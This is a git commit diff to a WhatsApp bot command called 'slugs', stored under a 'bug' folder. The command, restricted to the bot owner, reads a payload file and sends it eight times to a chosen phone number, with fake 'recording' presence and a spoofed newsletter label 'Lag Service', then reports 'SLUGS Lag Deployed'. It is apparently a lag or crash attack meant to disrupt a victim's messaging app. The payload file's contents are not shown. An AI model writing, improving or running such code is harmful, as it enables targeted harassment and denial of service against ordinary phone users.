6ab191497b6705b6636ff5027a7d23b282c50f72
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 16:54:24 +0300

    Update slug.js

--- commands/bug/slug.js
+++ commands/bug/slug.js
@@ -3,17 +3,18 @@ const config = require('../../config');
 
 module.exports = {
     name: "slugs",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         const payload = fs.readFileSync('./lib/payloads/slugs.txt', 'utf-8');
 
         for (let i = 0; i < 8; i++) {
+            await conn.sendPresenceUpdate('recording', target);
             await conn.sendMessage(target, { 
                 text: "\u200B" + payload,
-                contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } } 
+                contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ʟᴀɢ ꜱᴇʀᴠɪᴄᴇ" } }
             });
         }
-        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SLUGS Lag deployed.") });
+        await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: SLUGS Lag Deployed." });
     }
 };
